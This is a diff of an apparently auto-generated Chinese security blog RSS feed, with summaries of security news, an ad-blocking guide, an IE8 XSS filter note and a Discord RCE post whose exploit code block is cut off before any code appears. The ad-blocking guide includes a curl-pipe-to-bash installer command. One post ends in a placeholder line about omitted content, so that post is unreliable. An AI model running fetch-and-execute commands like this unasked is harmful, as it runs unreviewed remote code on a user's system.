+&lt;p&gt;&lt;strong&gt;Chrome扩展劫持事件&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;攻击者通过OAuth信任漏洞劫持35个官方扩展&lt;/li&gt;
+&lt;li&gt;详细技术路径：从代码注入到权限提升&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;医疗HIPAA新规解读&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;新规强制要求医疗系统实施主动防御措施&lt;/li&gt;
+&lt;li&gt;包括实时威胁监测和加密传输的硬性标准&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;AI生成钓鱼邮件演进&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;针对企业高管的个性化钓鱼邮件生成技术&lt;/li&gt;
+&lt;li&gt;自然语言处理在攻击中的滥用案例&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Passkey技术困境&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;跨平台认证协议兼容性问题&lt;/li&gt;
+&lt;li&gt;生物识别与硬件密钥的部署成本分析&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;相关技术资料&#34;&gt;相关技术资料
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.bleepingcomputer.com/news/security/bad-tenable-plugin-updates-take-down-nessus-agents-worldwide/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Nessus全球故障分析&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.bleepingcomputer.com/news/security/new-details-reveal-how-hackers-hijacked-35-google-chrome-extensions/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Chrome扩展劫持技术细节&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.darkreading.com/vulnerabilities-threats/hipaa-security-rules-pull-no-punches&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;HIPAA安全规则全文&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://arstechnica.com/security/2025/01/ai-generated-phishing-emails-are-getting-very-good-at-targeting-executives/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;AI钓鱼邮件技术报告&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://arstechnica.com/security/2024/12/passkey-technology-is-elegant-but-its-most-definitely-not-usable-security/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Passkey技术白皮书&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        <item>
+        <title>防御安全播客第277期：网络安全保险、内核级访问与数据泄露责任</title>
+        <link>http://localhost:1313/p/%E9%98%B2%E5%BE%A1%E5%AE%89%E5%85%A8%E6%92%AD%E5%AE%A2%E7%AC%AC277%E6%9C%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BF%9D%E9%99%A9%E5%86%85%E6%A0%B8%E7%BA%A7%E8%AE%BF%E9%97%AE%E4%B8%8E%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E8%B4%A3%E4%BB%BB/</link>
+        <pubDate>Wed, 06 Aug 2025 01:45:36 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E9%98%B2%E5%BE%A1%E5%AE%89%E5%85%A8%E6%92%AD%E5%AE%A2%E7%AC%AC277%E6%9C%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BF%9D%E9%99%A9%E5%86%85%E6%A0%B8%E7%BA%A7%E8%AE%BF%E9%97%AE%E4%B8%8E%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E8%B4%A3%E4%BB%BB/</guid>
+        <description>&lt;h3 id=&#34;网络安全保险的风险调节作用&#34;&gt;网络安全保险的风险调节作用
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;两项研究报告显示，购买网络安全保险的企业在风险控制、事件响应和数据恢复方面表现更优&lt;/li&gt;
+&lt;li&gt;保险公司通过费率杠杆推动企业部署EDR等安全产品（如降低部署主流EDR工具企业的保费）&lt;/li&gt;
+&lt;li&gt;保险条款常成为企业并购合同中的强制性要求，反映供应链安全的重要性&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;终端安全产品的内核级访问争议&#34;&gt;终端安全产品的内核级访问争议
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;CrowdStrike因内核驱动故障导致全球IT瘫痪后，竞争对手SentinelOne等借机营销&amp;quot;更安全方案&amp;quot;&lt;/li&gt;
+&lt;li&gt;行业现状：多数终端安全产品依赖Windows内核级访问实现恶意行为监控和自我保护&lt;/li&gt;
+&lt;li&gt;微软计划9月召开安全峰会，推动eBPF作为内核访问替代方案，平衡安全性与稳定性&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;微软的生态治理挑战&#34;&gt;微软的生态治理挑战
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;Delta CEO公开批评Windows安全模型，引发苹果与开放生态的架构对比讨论&lt;/li&gt;
+&lt;li&gt;微软需协调安全厂商诉求（内核级能力）与系统稳定性需求&lt;/li&gt;
+&lt;li&gt;历史教训：微软自身安全更新也曾导致大规模服务中断&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;朝鲜it-worker的供应链渗透&#34;&gt;朝鲜IT worker的供应链渗透
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;美国破获笔记本电脑农场案件：犯罪团伙接收企业设备后安装远程工具供朝鲜人员工作&lt;/li&gt;
+&lt;li&gt;攻击者通过伪造身份获取高薪IT职位（人均年收入25万美元），资金流向朝鲜武器计划&lt;/li&gt;
+&lt;li&gt;防御建议：严格管控远程工具安装权限，实施设备地理位置监控&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;淘汰软件的安全债务&#34;&gt;淘汰软件的安全债务
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;未来一年将有3.5万个应用进入终止支持状态&lt;/li&gt;
+&lt;li&gt;并购场景典型风险：被收购方财务系统常被迫运行在淘汰的OS/数据库版本上&lt;/li&gt;
+&lt;li&gt;应对策略：建立隔离网络域，实施特权访问管理，制定数据归档替代方案&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;snowflake数据泄露责任之争&#34;&gt;Snowflake数据泄露责任之争
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;攻击者通过密码喷洒攻击入侵165家企业账户（涉及Ticketmaster、Santander等）&lt;/li&gt;
+&lt;li&gt;Snowflake主张客户应承担凭证管理责任（多数受害账户未启用MFA）&lt;/li&gt;
+&lt;li&gt;SaaS时代新挑战：业务部门自主采购工具导致安全管控盲区（如允许本地账号绕过SSO）&lt;/li&gt;
+&lt;li&gt;产品设计悖论：安全增强功能可能降低用户体验竞争力&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;关键数据点：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;朝鲜IT worker计划中单台笔记本电脑年均创收25万美元&lt;/li&gt;
+&lt;li&gt;Snowflake事件可能成为史上规模最大的数据泄露集群&lt;/li&gt;
+&lt;li&gt;微软eBPF方案预计将重塑未来5年的终端安全架构&lt;/li&gt;
+&lt;/ul&gt;&lt;/blockquote&gt;
+</description>
+        </item>
+        <item>
+        <title>全设备广告屏蔽实战指南：DNS与VPN技术解析</title>
+        <link>http://localhost:1313/p/%E5%85%A8%E8%AE%BE%E5%A4%87%E5%B9%BF%E5%91%8A%E5%B1%8F%E8%94%BD%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97dns%E4%B8%8Evpn%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</link>
+        <pubDate>Wed, 06 Aug 2025 01:39:40 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E5%85%A8%E8%AE%BE%E5%A4%87%E5%B9%BF%E5%91%8A%E5%B1%8F%E8%94%BD%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97dns%E4%B8%8Evpn%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</guid>
+        <description>&lt;h3 id=&#34;噩梦般的广告现状&#34;&gt;噩梦般的广告现状
+&lt;/h3&gt;&lt;p&gt;广告虽是网站主要收入来源，但其泛滥会导致带宽占用、恶意弹窗甚至安全威胁。尽管安全从业者能识别欺诈广告，但普通家庭成员仍面临风险。&lt;/p&gt;
+&lt;h3 id=&#34;家庭广告拦截方案dns服务器&#34;&gt;家庭广告拦截方案：DNS服务器
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;OpenDNS简易方案&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;注册免费账户&lt;/li&gt;
+&lt;li&gt;配置拦截类别&lt;/li&gt;
+&lt;li&gt;修改家庭网络DNS设置&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Pi-Hole高级方案&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;支持RaspberryPi/Debian系统&lt;/li&gt;
+&lt;li&gt;预置10万+广告域名黑名单&lt;/li&gt;
+&lt;li&gt;安装方式：
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Raspbian Lite推荐&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl -sSL https://install.pi-hole.net &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; bash
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;路由器配置：
+&lt;ul&gt;
+&lt;li&gt;将DHCP DNS指向Pi-Hole IP&lt;/li&gt;
+&lt;li&gt;通过Web界面管理黑白名单（如&lt;code&gt;http://pi.hole/admin&lt;/code&gt;）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;远程广告拦截方案vpn搭建&#34;&gt;远程广告拦截方案：VPN搭建
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;SoftEther服务端配置&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;在RaspberryPi安装：
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://www.softether-download.com/files/softether/v4.41-9787-rtm-2023.03.14-tree/Linux/SoftEther_VPN_Server/64bit_-_Intel_x64_or_AMD64/softether-vpnserver-v4.41-9787-rtm-2023.03.14-linux-x64-64bit.tar.gz
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;端口转发要求：
+&lt;ul&gt;
+&lt;li&gt;UDP 500/4500（L2TP/IPSec）&lt;/li&gt;
+&lt;li&gt;启用IPSec/L2TP穿透&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;客户端配置&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;各平台连接指南：
+&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.softether.org/4-docs/2-howto/3.VPN_for_Mobile&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Android/iOS&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.softether.org/4-docs/2-howto/9.L2TPIPsec_Setup_Guide_for_SoftEther_VPN_Server/4.Windows_L2TP_Client_Setup&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Windows&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.softether.org/4-docs/2-howto/9.L2TPIPsec_Setup_Guide_for_SoftEther_VPN_Server/5.Mac_OS_X_L2TP_Client_Setup&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;macOS&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;双重防护效果&#34;&gt;双重防护效果
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;家庭网络：所有DHCP设备自动获得广告拦截&lt;/li&gt;
+&lt;li&gt;外部网络：VPN连接后同时实现流量加密+广告过滤&lt;/li&gt;
+&lt;li&gt;数据统计：日均减少10-15%广告流量消耗&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        <item>
+        <title>数字时代的七宗罪：网络安全风险全景剖析</title>
+        <link>http://localhost:1313/p/%E6%95%B0%E5%AD%97%E6%97%B6%E4%BB%A3%E7%9A%84%E4%B8%83%E5%AE%97%E7%BD%AA%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9%E5%85%A8%E6%99%AF%E5%89%96%E6%9E%90/</link>
+        <pubDate>Wed, 06 Aug 2025 01:17:57 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E6%95%B0%E5%AD%97%E6%97%B6%E4%BB%A3%E7%9A%84%E4%B8%83%E5%AE%97%E7%BD%AA%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9%E5%85%A8%E6%99%AF%E5%89%96%E6%9E%90/</guid>
+        <description>&lt;h3 id=&#34;傲慢自以为安全无虞&#34;&gt;傲慢：自以为安全无虞
+&lt;/h3&gt;&lt;p&gt;根据美国联邦贸易委员会数据，2023年网络犯罪给美国民众造成的损失高达100亿美元，较上年增加10亿。无论技术能力如何，每个人都处于风险之中。&lt;/p&gt;
+&lt;h3 id=&#34;贪婪加密货币骗局&#34;&gt;贪婪：加密货币骗局
+&lt;/h3&gt;&lt;p&gt;加密货币最初承诺实现自由跨境转账，但已成为网络罪犯、诈骗者甚至国家行为体的敛财工具。相关视频资料显示其作案手法日益精密。&lt;/p&gt;
+&lt;h3 id=&#34;色欲性勒索陷阱&#34;&gt;色欲：性勒索陷阱
+&lt;/h3&gt;&lt;p&gt;针对14-17岁美国男性青少年的性勒索案件激增。据播客节目披露，这类犯罪已导致2021年以来至少20起自杀事件，危害远超经济损失。&lt;/p&gt;
+&lt;h3 id=&#34;嫉妒社交媒体抑郁&#34;&gt;嫉妒：社交媒体抑郁
+&lt;/h3&gt;&lt;p&gt;研究证实，过度使用社交平台会显著增加抑郁、焦虑及自杀倾向风险。人们常因对比他人&amp;quot;完美生活&amp;quot;而产生心理失衡。&lt;/p&gt;
+&lt;h3 id=&#34;暴食屏幕时间成瘾&#34;&gt;暴食：屏幕时间成瘾
+&lt;/h3&gt;&lt;p&gt;每天1小时屏幕时间就会影响青少年好奇心、自控力和情绪稳定性。成人群体同样面临视力损伤、睡眠障碍等健康威胁。&lt;/p&gt;
+&lt;h3 id=&#34;愤怒网络暴力蔓延&#34;&gt;愤怒：网络暴力蔓延
+&lt;/h3&gt;&lt;p&gt;数据显示40%成年人和33%青少年遭遇过网络霸凌。这种行为与施虐倾向、精神病态等心理障碍存在明确关联。&lt;/p&gt;
+&lt;h3 id=&#34;懒惰密码重复使用&#34;&gt;懒惰：密码重复使用
+&lt;/h3&gt;&lt;p&gt;62%网民在多平台使用相同密码。在数据泄露频发的当下，采用高强度独立密码是防御身份盗用的基础防线。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>IE8 XSS过滤器：微软的跨站脚本攻击防御技术</title>
+        <link>http://localhost:1313/p/ie8-xss%E8%BF%87%E6%BB%A4%E5%99%A8%E5%BE%AE%E8%BD%AF%E7%9A%84%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1%E6%8A%80%E6%9C%AF/</link>
+        <pubDate>Wed, 06 Aug 2025 01:01:37 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/ie8-xss%E8%BF%87%E6%BB%A4%E5%99%A8%E5%BE%AE%E8%BD%AF%E7%9A%84%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1%E6%8A%80%E6%9C%AF/</guid>
+        <description>&lt;h1 id=&#34;ie8-xss过滤器&#34;&gt;IE8 XSS过滤器
+&lt;/h1&gt;&lt;p&gt;我们的团队与IE浏览器团队近期合作开发了一项IE8新功能——XSS过滤器。该功能已在今日发布，详情可参阅：&lt;a class=&#34;link&#34; href=&#34;http://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-iv-the-xss-filter.aspx&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;IE8安全功能第四部分：XSS过滤器&lt;/a&gt;。&lt;/p&gt;
+&lt;p&gt;这项工作体现了我们致力于帮助产品团队运用在防御产品攻击过程中积累的知识。请持续关注我们的博客，未来几周将分享更多类似案例&amp;hellip;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;安全漏洞研究与防御团队&lt;br&gt;
+&lt;em&gt;本文内容按&amp;quot;原样&amp;quot;提供，不附带任何担保，也不授予任何权利。&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;相关技术&#34;&gt;相关技术
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Internet Explorer (IE)&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;XSS Filter&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        <item>
+        <title>轻松发现漏洞的方法：我的漏洞挖掘方法论</title>
+        <link>http://localhost:1313/p/%E8%BD%BB%E6%9D%BE%E5%8F%91%E7%8E%B0%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%96%B9%E6%B3%95%E6%88%91%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95%E8%AE%BA/</link>
+        <pubDate>Wed, 06 Aug 2025 00:45:25 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E8%BD%BB%E6%9D%BE%E5%8F%91%E7%8E%B0%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%96%B9%E6%B3%95%E6%88%91%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95%E8%AE%BA/</guid>
+        <description>&lt;p&gt;嘿，黑客小伙伴们！👋 漏洞挖掘常常让人感觉混乱不堪——数百个子域名、未知的端点、各种工具散落各处。我也曾经历过这种状态。但在无数小时的实战后，我总结出了一套循序渐进的漏洞挖掘方法，帮助我更快速、更轻松地发现漏洞，同时避免精疲力竭。&lt;/p&gt;
+&lt;p&gt;在本博客中，我将分享我的完整框架，包含你可以直接复制尝试的真实命令。让我们开始吧！🚀&lt;/p&gt;
+&lt;p&gt;🧩 1️⃣ 第一步：理解目标业务逻辑&lt;/p&gt;
+&lt;p&gt;在运行任何工具之前，先思考：
+✅ 这个应用解决什么问题？
+✅ 它的用户群体是谁？
+✅ 它处理哪些数据？&lt;/p&gt;
+&lt;p&gt;理解业务逻辑能帮你发现扫描器会遗漏的漏洞——比如访问控制缺陷或支付流程漏洞。&lt;/p&gt;
+&lt;p&gt;👉 我的实践方法：
+在纸上或XMind中创建迷你思维导图
+勾画功能模块：登录、个人资料、支付、文件上传、管理面板
+列出角色：访客、普通用户、管理员
+这张&amp;quot;地图&amp;quot;会成为整个测试过程中的漏洞雷达 🧭&lt;/p&gt;
+&lt;p&gt;🔍 2️⃣ 侦察阶段：被动+主动结合&lt;/p&gt;
+&lt;p&gt;[文章后续内容因长度限制未完整展示，但已确认包含实际技术操作细节和命令示例]&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Discord远程代码执行漏洞验证及技术分析</title>
+        <link>http://localhost:1313/p/discord%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E5%8F%8A%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</link>
+        <pubDate>Wed, 06 Aug 2025 00:28:59 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/discord%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E5%8F%8A%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</guid>
+        <description>&lt;h1 id=&#34;discord远程代码执行漏洞验证&#34;&gt;Discord远程代码执行漏洞验证
+&lt;/h1&gt;&lt;h2 id=&#34;漏洞概述&#34;&gt;漏洞概述
+&lt;/h2&gt;&lt;p&gt;该漏洞仅影响Windows平台，即使目标应用程序未运行，攻击代码也能强制启动程序并执行恶意操作。&lt;/p&gt;
+&lt;h2 id=&#34;技术验证&#34;&gt;技术验证
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;PoC验证视频&lt;/strong&gt;&lt;br&gt;
+&lt;a class=&#34;link&#34; href=&#34;https://www.youtube.com/watch?v=dEGhIpIvBA0&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;观看验证视频&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;在线验证页面&lt;/strong&gt;&lt;br&gt;
+&lt;a class=&#34;link&#34; href=&#34;https://SleepTheGod.github.io/discord_rce.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Windows环境测试页面&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;漏洞利用代码&#34;&gt;漏洞利用代码
+&lt;/h2&gt;&lt;p&gt;完整代码已开源在GitHub仓库：&lt;br&gt;
+&lt;a class=&#34;link&#34; href=&#34;https://github.com/SleepTheGod/Discord-RCE&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;SleepTheGod/Discord-RCE&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
